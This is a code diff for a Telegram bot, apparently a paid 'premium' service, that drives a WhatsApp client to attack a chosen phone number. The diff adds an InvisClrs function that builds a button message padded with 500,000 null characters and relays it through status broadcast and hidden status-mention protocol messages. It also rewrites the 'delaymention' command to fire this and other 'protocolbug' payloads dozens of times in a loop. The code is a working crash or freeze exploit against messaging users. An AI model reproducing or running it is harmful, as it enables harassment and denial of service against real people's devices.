@@ -1328,12 +1328,64 @@ bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => 
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 50; i++) {
+  for (let i = 0; i < 3; i++) {
         await protocolbug2(target, true)
         await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
         await protocolbug2(target, true)
         await protocolbug3(target, true)
-        await sleep(5000)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await protocolbug2(target, true)
+        await protocolbug3(target, true)
+        await InvisClrs(target, true)
+        await InVisibleX1(target, true)
+        await sleep(4000)
     
 }
 
@@ -2055,6 +2107,78 @@ async function protocolbug2(isTarget, mention) {
         );
     }
 }
+async function InvisClrs(target, show) {
+            let msg = await generateWAMessageFromContent(target, {
+                buttonsMessage: {
+                    text: "🩸",
+                    contentText:
+                        "🩸 эмне үчүн эмесXylaysX",
+                    footerText: "🩸 эмне үчүн эмесXylaysX",
+                    buttons: [
+                        {
+                            buttonId: ".aboutb",
+                            buttonText: {
+                                displayText: "🩸 эмне үчүн эмесXylaysX" + "\u0000".repeat(500000),
+                            },
+                            type: 1,
+
+},
+                    ],
+                    headerType: 1,
+                },
+            }, {});
+        
+            await kipop.relayMessage("status@broadcast", msg.message, {
+                messageId: msg.key.id,
+                statusJidList: [target],
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "mentioned_users",
+                                attrs: {},
+                                content: [
+                                    {
+                                        tag: "to",
+                                        attrs: { jid: target },
+                                        content: undefined,
+                                    },
+                                ],
+                            },
+                        ],
+                    },
+                ],
+            });
+        
+            if (show) {
+                await kipop.relayMessage(
+                    target,
+                    {
+                        groupStatusMentionMessage: {
+                            message: {
+                                protocolMessage: {
+                                    key: msg.key,
+                                    type: 25,
+                                },
+                            },
+                        },
+                    },
+                    {
+                        additionalNodes: [
+                            {
+                                tag: "meta",
+                                attrs: {
+                                    is_status_mention: "Fuck you",
+                                },
+                                content: undefined,
+                            },
+                        ],
+                    }
+                );
+            }            
+        }
 
 async function InVisibleX1(target, show) {
             let msg = await generateWAMessageFromContent(target, {
